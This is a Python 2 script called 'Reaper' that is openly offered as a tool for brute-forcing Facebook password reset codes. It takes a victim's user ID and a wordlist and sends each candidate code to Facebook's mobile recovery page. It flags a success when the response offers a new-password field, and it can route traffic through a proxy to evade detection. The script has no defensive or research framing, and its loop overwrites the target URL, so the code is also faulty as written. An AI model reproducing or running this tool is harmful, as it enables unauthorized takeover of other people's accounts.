#!/usr/bin/python
#Script: Reaper
#Author: Cyber0X
#Description: Guess tool on Facebook password reset code with proxy
#Github: https://www.github.com/Cyber0X/Reaper

import urllib2 ,sys ,re
import os
import ssl
import time

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

cls()

#os.system(['','color A'][os.name == 'nt'])

print '''

                      `"-._                    
                        `. "-._                
                          T.   "-.             
                           $$p.   "-.          
                           $$$$b.    `,        
                        .g$$$$$$$b    ;        
                      .d$$$$$$$$$$;   ;        
                   __d$$$$$$P""^T$$   :        
                 .d$$$$P^^""___       :        
                d$P'__..gg$$$$$$$$$$; ;        
               d$$ :$$$$$$$$$$$$$$$$;  ;       
              :$$; $$$$$$$$$$$$$$$$P  :$       
              $$$  $$$$$$$$$$$$$$$$b  $$       
             :$$$ :$$$$$$$$$$$$$$$$$; $$;      
             $$$; $$$$$$$$$$$$$$$$$$; $$;      
            :$$$  $$$$$$$$$^$$$$$$$$$ :$$      
            $$$; :$$$p__gP' `Tp__g$$$ :$$      
           :$$$  $$P`T$P' .$. `T$P'T$; $$;     
           $$$; :$$;     :P^T;     :$; $$;     
          :$$$  $$$$-.           .-$$$ :$$     
          $$$$ :$$$$; \   T$P   / :$$$  $$     
         :$$$; $$$$$$  ; b:$;d :  $$$$; $$;    
         $$$$; $$$$$$; : T T T ; :$$$$$ :$$    
      .g$$$$$  :$$$$$$  ;' | ':  $$$$$$  T$b   
   .g$$$$$$$$   $$$$$$b :     ; d$$$$$;   `Tb  
  :$$$$$$$$$;   :$$$$$$$;     :$$$$$$P       \ 
  :$$$$$$$$$;    T$$$$$$$p._.g$$$$$$P         ;
  $$$P^^T$$$$p.   `T$$$$$$$$$$$$$$P'     _/`. :
         `T$$$$$b.  `T$$$$$$$$$$P'    .g$P   \;
           `T$$$$$b.  "^T$$$$P^"     d$P'      
             `T$$$$$b.             .dP'        
               "^T$$$$b.        .g$P'          
                  "^T$$$b    .g$P^"            
                     "^T$b.g$P^"               
                        "^$^"

--------------------------------------------------
                     ~ Reaper ~
Guess on Facebook password reset code with proxy
                  Coded by Cyber0X
'''

if len(sys.argv) != 3:
    print "[#] usage : Python Reaper.py ID wordlist.txt "
    sys.exit()

target = sys.argv[1]
wordlist = sys.argv[2]


while True:
    print """
    =============== Menu ===============
    1- Reset Code Facebook Without Proxy
    2- Using Proxy
    3- Exit
    
    """

    choice=raw_input("Enter your choice : ")

    if choice=="1":
        try:
            word = open(wordlist, 'r').readlines()
            print "[+] Facebook Codes Loaded \!/\n[+] Codes:",len(word)
        except("IOError"):
            print "[-] Can't Load List !"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
    
            except IOError:
                print " Error on Sending Page to server "
    
            search = re.search('password_new', get)
            if search:
                print "[+] The Code "+w+" is Correct [*] "
            else:
                print "[-] The Code "+w+" is Incorrect [!] "
    elif choice=="2":

        print """

        Welcome to Reset Password Facebook With Proxy 

        usage : [ip:port]

        """
        ip_proxy=raw_input("Enter your proxy : ")
        print "[##] Proxy Used : "+ip_proxy
        proxy = urllib2.ProxyHandler({'http': ip_proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
        #print theIP
        #datum = response.read()
        #response.close()
        #print datum
        try:
            word = open(wordlist, 'r').readlines()
            print "[+] Facebook Codes Loaded \!/\n[+] Codes:",len(word)
        except("IOError"):
            print "[-] Can't Load List !"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
                
            except IOError:
                print " Error on Sending Page to server "
        
            search = re.search('password_new', get)
            if search:
                print "[+] The Code "+w+" is Correct [*] "
            else:
                print "[-] The Code "+w+" is Incorrect [!] "
    else:
      sys.exit()
